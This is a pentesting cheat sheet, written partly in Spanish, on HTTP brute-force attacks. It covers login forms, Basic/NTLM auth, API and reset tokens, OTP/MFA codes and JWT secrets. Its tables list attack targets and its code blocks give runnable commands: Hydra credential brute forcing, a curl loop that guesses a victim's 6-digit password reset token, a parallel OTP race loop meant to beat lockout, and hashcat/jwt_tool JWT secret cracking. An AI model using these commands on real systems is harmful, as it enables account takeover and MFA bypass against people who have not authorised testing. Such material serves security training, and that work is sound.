---
aliases:
  - Login Brute
  - API Key Brute
  - JWT Secret Crack
  - OTP Brute
tags:
  - type/cheatsheet
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[JWT Attacks]]"
  - "[[Authentication & Authorization Bypass]]"
---
# HTTP Brute Forcing - Targets de Ataque

***

## Login Forms (Form-Based)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Username + password POST | `username=admin&password=PASS` | Standard form. |
| Email + password POST | `email=user@x&password=PASS` | Common variant. |
| Multi-step (user → pass) | Two-page flow Microsoft-style | Two requests. |
| CSRF token required | Get token first, replay in request | Pre-fetch. |
| Captcha required | Solvable via API (2captcha) | Slow attack. |
| JS-required submit | Headless browser (Puppeteer/Playwright) | Anti-bot. |
| Hidden field validation | Pre-fetch hidden field value | Token rotation. |
| WAF challenge cookie | Browser challenge → cookie | Headless required. |
| `remember_me` checkbox | Sometimes affects rate limit | Edge. |
| Bot trap honeypot field | Hidden field — leave empty | Defender trap. |
| Form action URL diff | `/login` vs `/auth/internal` | Per-form. |
| Multipart form-data | `Content-Type: multipart/form-data` | Less common. |
| Login con OTP combinado | Username + password + OTP same form | Single-step MFA. |
| `redirect_uri` post-success | URL hint of success | Indirect. |
| Cookie-set requirement | Pre-set cookie required | Stateful. |
| Referer required | `Referer: https://target/login` | Anti-CSRF. |
^bf-target-login

### Hydra HTTP form attack

```bash
# Form POST con failure string match
hydra -L users.txt -P passwords.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Con cookie required
hydra -L users.txt -P passwords.txt \
  target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:H=Cookie\: session=XYZ:F=Invalid"
```

___

## Basic / Digest / NTLM Authentication

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTTP Basic Auth | `Authorization: Basic base64(user:pass)` | Trivial brute. |
| HTTP Digest Auth | `Authorization: Digest username=...,response=...` | Hash challenge. |
| NTLM Auth | `Authorization: NTLM ...` (3-step) | Windows IIS. |
| Negotiate (Kerberos/NTLM) | `Authorization: Negotiate ...` | Enterprise. |
| Bearer token | `Authorization: Bearer XXX` | API tokens. |
| Custom auth header | `X-Auth-Token: XXX` | App-specific. |
| Cookie-only auth | `Cookie: session=XXX` | Session brute. |
| API key URL param | `?api_key=XXX` | Old-style. |
| API key header | `X-API-Key: XXX` | Modern. |
| HMAC-signed requests | `Signature: HMAC(secret, ...)` | Brute secret. |
| AWS Signature V4 | Complex sig calc | Specific tooling. |
| OAuth Bearer | RFC 6750 | Combo OAuth attack. |
| JWT Bearer | JWT in Authorization | Brute secret + replay. |
| SAML assertion brute | XML signature | Complex. |
| Mutual TLS cert | Client cert | Out-of-scope brute. |
| API gateway tokens | Kong/AWS API GW | Per-vendor. |
^bf-target-basic

### Hydra basic auth

```bash
# HTTP Basic
hydra -L users.txt -P passwords.txt target.com http-get /admin

# HTTPS Basic
hydra -L users.txt -P passwords.txt -s 443 target.com https-get /admin

# Manual base64 brute
for pass in $(cat passwords.txt); do
  RESP=$(curl -s -o /dev/null -w '%{http_code}' \
    -u "admin:$pass" https://target/admin)
  [ "$RESP" = "200" ] && echo "FOUND: $pass" && break
done
```

___

## API Keys / Tokens / Secrets

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| API key endpoint | `?api_key=FUZZ` | URL param. |
| Bearer token API | `Authorization: Bearer FUZZ` | Modern API. |
| Webhook signing secret | HMAC with key brute | Replay attack. |
| Pre-signed URL token | URL token brute | S3-style. |
| Reset token random | `?token=FUZZ` en reset link | Predictable tokens. |
| Magic link token | Email link token brute | Short tokens. |
| Email verify token | Verification link brute | Account hijack. |
| 2FA backup code | 8-10 char alphanumeric | Brute viable. |
| Invitation token | Onboarding link | Pre-acceptance. |
| Webhook ID | UUID guess if predictable | Sequential. |
| Session ID brute | Sequential or timestamp-based | Insecure RNG. |
| Cookie value brute | Sequential session | Old apps. |
| CSRF token brute | If short/predictable | Edge. |
| Captcha bypass token | Re-use captcha responses | Cache. |
| SMS OTP 4-6 digits | 10000 (4-digit) o 1M (6-digit) | Burst attack. |
| TOTP within drift window | 30s window, 1-2 codes valid | Race. |
^bf-target-tokens

### Reset token brute

```bash
# 6-digit reset token
for code in {000000..999999}; do
  RESP=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target/reset?email=victim@x&token=$code")
  if [ "$RESP" = "302" ]; then
    echo "FOUND: $code"
    break
  fi
done
```

___

## OTP / MFA Codes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| 4-digit numeric | 10,000 combinaciones | Trivial sin rate limit. |
| 6-digit numeric (TOTP) | 1,000,000 combinaciones | Race-based viable. |
| 8-digit backup code | 10^8 — slow | Wordlist tipo. |
| Alphanumeric 6-char | 36^6 = 2B | Slow. |
| Alphanumeric 8-char | 36^8 = 2.8T | Infeasible. |
| TOTP 30s window | Solo 1-2 codes válidos en cualquier momento | Race. |
| HOTP counter-based | Counter unknown — brute counter | Edge. |
| SMS OTP 4-6 digit | Standard | Race + lockout bypass. |
| Email OTP 6-8 digit | Standard | Slower delivery. |
| Voice OTP | Same as SMS | Telephony. |
| Push notification approval | No brute — needs phishing | Out-of-scope. |
| FIDO2/WebAuthn | Phishing-resistant | Out-of-scope brute. |
| Biometric | Out-of-scope | Hardware. |
| Hardware token (YubiKey) | OTP brute possible if no challenge | Race. |
| Multi-factor combined | Username+pass+OTP same submit | Race + brute combo. |
| Backup recovery codes | 8-10 chars usually | Slower brute. |
^bf-target-otp

### OTP race brute

```bash
# Burp Turbo Intruder for parallel OTP submit (race condition)
# Send 1000 simultaneous requests con codes 000000-000999
# Si lockout aplica post-fail, race antes del lock = 1000 attempts en window válida

# CLI raw
for code in {0000..9999}; do
  curl -s -X POST https://target/verify-otp \
    -d "code=$code" \
    -H "Cookie: session=$SESS" &
done
wait
```

___

## Session Cookie / JWT Secret

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Session ID predictable | Sequential / timestamp | Insecure RNG. |
| Session ID short | <128 bits entropy | Brute viable. |
| Session ID encoded | Base64 reveals structure | Decode + manipulate. |
| JWT HMAC secret weak | hashcat -m 16500 | Common. |
| JWT alg=none | No brute — direct forge | Combo JWT Attacks. |
| JWT kid path traversal | `kid: ../../tmp/x` | Combo. |
| Cookie HMAC secret | Brute via paddings differential | Edge. |
| CSRF token derivation | If derived from session predictably | Reverse-engineer. |
| Custom signed token | Inspect for HMAC pattern | App-specific. |
| Cookie encryption key | AES key brute (if weak) | Padding oracle combo. |
| Remember-me token | Long-lived, brute viable | Persistent attack. |
| API HMAC signing key | Replay + brute via signed responses | Custom auth. |
| Webhook signing | HMAC over payload | Replay. |
| Reset token HMAC | If structured | Reverse. |
| OAuth client_secret | If leaked or weak | Combo OAuth. |
| Refresh token brute | Long-lived persistence | Combo. |
^bf-target-session

### JWT secret crack

```bash
# Capture JWT
JWT="eyJhbG...REST..."

# hashcat HMAC crack
echo "$JWT" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool brute
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
```

***
